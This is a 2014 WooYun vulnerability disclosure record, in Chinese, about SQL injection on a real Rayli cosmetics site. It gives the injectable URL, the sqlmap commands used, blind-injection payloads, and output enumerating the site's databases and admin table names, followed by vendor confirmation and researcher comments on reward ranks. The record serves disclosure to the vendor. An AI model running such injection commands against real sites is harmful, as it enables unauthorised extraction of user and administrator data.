{"id": 52499, "wybug_id": "wooyun-2014-071036", "wybug_title": "瑞丽某站存在SQL注入大量隐私泄露可拖库", "wybug_corp": "rayli.com.cn", "wybug_author": "进击的zjx", "wybug_date": "2014-08-04 22:58", "wybug_open_date": "2014-09-18 23:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向公众公开  简要描述： 自从我看了关于瑞丽厂商之前SQL的漏洞，有的给5rank，有的给1rank，更有甚者直接忽略，忽略就忽略吧，那就别厚着脸皮私底下修复！辛辛苦苦给你们找漏洞，真不把白帽子当人看！如果我这篇厂商给1，或者忽略，那么请给我点掌声，然后对瑞丽说goodbye！！！谢谢…… 详细说明：  废话不多说直接上注入点http://hzp.rayli.com.cn/tryapply/tryreportlist/?tryid=880   漏洞证明：  sqlmap跑的结果：三个数据库，几百张表，其中包括管理员账号密码等数据。我也懒得把跑出来解密然后登陆后台了，懂的人自然懂危害有多大。\nC:\\Python27\\sqlmap>sqlmap.py -u http://hzp.rayli.com.cn/tryapply/tryreportlist/?tryid=880 --dbs --threads 10    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 22:02:02[22:02:02] [INFO] resuming back-end DBMS 'mysql'[22:02:02] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: tryid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tryid=880' AND 2372=2372 AND 'dIIt'='dIIt    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: tryid=880' AND SLEEP(5) AND 'RpUO'='RpUO---[22:02:03] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.5back-end DBMS: MySQL 5.0.11[22:02:03] [INFO] fetching database names[22:02:03] [INFO] fetching number of databases[22:02:03] [INFO] resumed: 3[22:02:03] [INFO] retrieving the length of query output[22:02:03] [INFO] retrieved:[22:02:03] [WARNING] reflective value(s) found and filtering out18[22:02:29] [INFO] retrieved: information_schema[22:02:29] [INFO] retrieving the length of query output[22:02:29] [INFO] retrieved: 3[22:02:38] [INFO] retrieved: hzp[22:02:38] [INFO] retrieving the length of query output[22:02:38] [INFO] retrieved: 4[22:02:47] [INFO] retrieved: testavailable databases [3]:[*] hzp[*] information_schema[*] test\n3个数据库，然后跑跑表。下面数据是数据库hzp里的，有109个表，碍于时间关系没跑完。\nC:\\Python27\\sqlmap>sqlmap.py -u http://hzp.rayli.com.cn/tryapply/tryreportlist/?tryid=880 -D hzp --tables --threads 10    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 22:04:59[22:04:59] [INFO] resuming back-end DBMS 'mysql'[22:04:59] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: tryid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tryid=880' AND 2372=2372 AND 'dIIt'='dIIt    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: tryid=880' AND SLEEP(5) AND 'RpUO'='RpUO---[22:04:59] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.5back-end DBMS: MySQL 5.0.11[22:04:59] [INFO] fetching tables for database: 'hzp'[22:04:59] [INFO] fetching number of tables for database 'hzp'[22:04:59] [INFO] retrieved:[22:05:00] [WARNING] reflective value(s) found and filtering out109[22:05:05] [INFO] retrieving the length of query output[22:05:05] [INFO] retrieved: 7[22:05:16] [INFO] retrieved: j_brand[22:05:16] [INFO] retrieving the length of query output[22:05:16] [INFO] retrieved: 9[22:05:29] [INFO] retrieved: j_details[22:05:30] [INFO] retrieving the length of query output[22:05:30] [INFO] retrieved: 7[22:05:42] [INFO] retrieved: j_types[22:05:42] [INFO] retrieving the length of query output[22:05:42] [INFO] retrieved: 12[22:06:01] [INFO] retrieved: pdt_activity[22:06:01] [INFO] retrieving the length of query output[22:06:01] [INFO] retrieved: 20[22:06:29] [INFO] retrieved: pdt_activity_content[22:06:29] [INFO] retrieving the length of query output[22:06:29] [INFO] retrieved: 17[22:07:04] [INFO] retrieved: pdt_activity_logs[22:07:04] [INFO] retrieving the length of query output[22:07:04] [INFO] retrieved: 18[22:07:32] [INFO] retrieved: pdt_activity_medal[22:07:32] [INFO] retrieving the length of query output[22:07:32] [INFO] retrieved: 15[22:07:54] [INFO] retrieved: pdt_admin_group[22:07:54] [INFO] retrieving the length of query output[22:07:54] [INFO] retrieved: 13[22:08:27] [INFO] retrieved: pdt_admin_log[22:08:27] [INFO] retrieving the length of query output[22:08:27] [INFO] retrieved: 19[22:08:54] [INFO] retrieved: pdt_admin_login_log[22:08:54] [INFO] retrieving the length of query output[22:08:54] [INFO] retrieved: 16[22:09:19] [INFO] retrieved: pdt_admin_member[22:09:19] [INFO] retrieving the length of query output[22:09:19] [INFO] retrieved: 17[22:09:44] [INFO] retrieved: pdt_admin_purview[22:09:44] [INFO] retrieving the length of query output[22:09:44] [INFO] retrieved: 14[22:10:04] [INFO] retrieved: pdt_admin_user[22:10:04] [INFO] retrieving the length of query output[22:10:04] [INFO] retrieved: 19[22:10:31] [INFO] retrieved: pdt_admin_usergroup[22:10:31] [INFO] retrieving the length of query output[22:10:31] [INFO] retrieved: 10[22:10:47] [INFO] retrieved: pdt_adtest[22:10:47] [INFO] retrieving the length of query output[22:10:47] [INFO] retrieved: 11[22:11:04] [INFO] retrieved: pdt_api_log[22:11:04] [INFO] retrieving the length of query output[22:11:04] [INFO] retrieved: 11[22:11:23] [INFO] retrieved: pdt_article[22:11:23] [INFO] retrieving the length of query output[22:11:23] [INFO] retrieved: 20[22:11:49] [INFO] retrieved: pdt_article_relation[22:11:49] [INFO] retrieving the length of query output[22:11:49] [INFO] retrieved: 16[22:12:22] [INFO] retrieved: pdt_article_type[22:12:22] [INFO] retrieving the length of query output[22:12:22] [INFO] retrieved: 14[22:12:41] [INFO] retrieved: pdt_atv_awards[22:12:41] [INFO] retrieving the length of query output[22:12:41] [INFO] retrieved: 13[22:13:02] [INFO] retrieved: pdt_atv_prize[22:13:02] [INFO] retrieving the length of query output[22:13:02] [INFO] retrieved: 12[22:13:22] [INFO] retrieved: pdt_atv_user[22:13:22] [INFO] retrieving the length of query output[22:13:22] [INFO] retrieved: 19[22:13:37] [INFO] retrieved: p_t_basety_________ 9/19 (47%)\n从上面表里明显有admin_member ,admin_user 等刺眼tables，懂得人自然懂里面放的是什么！就这样。我也不搞破坏，对你们的后台管理员身份也不感兴趣。但若被竞争对手拿到这些隐私数据，我想就呵呵了   修复方案：  过滤，预编译，等等，你们比我懂   版权声明：转载请注明来源 进击的zjx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-08-05 08:50 厂商回复： 非常感谢对瑞丽网安全工作的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-05 10:00 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  为啥厂商给15rank，乌云最后结算才4个rank啊。。    \n     2014-08-25 09:33 |    \t\tdarkrerror \t\t\t( 普通白帽子  |\t\t\t        Rank:263 漏洞数:44        )\t\t \n  因为是走小厂商流程，@进击的zxc    \n     2014-08-25 09:52 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  @darkrerror 我现在知道了。就走过一次大厂商，还是捡来的漏洞-_-#    \n     2014-08-25 09:55 |    \t\tdarkrerror \t\t\t( 普通白帽子  |\t\t\t        Rank:263 漏洞数:44        )\t\t \n  说出来都是泪    \n     2014-09-05 13:01 |    \t\t看风者 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:14        | To shun evil is understanding)\t\t \n  @进击的zjx 把目标改成sbat嘛，要不就走通用漏洞    \n     2014-09-05 13:18 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  @看风者 太菜通用走不动- -    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}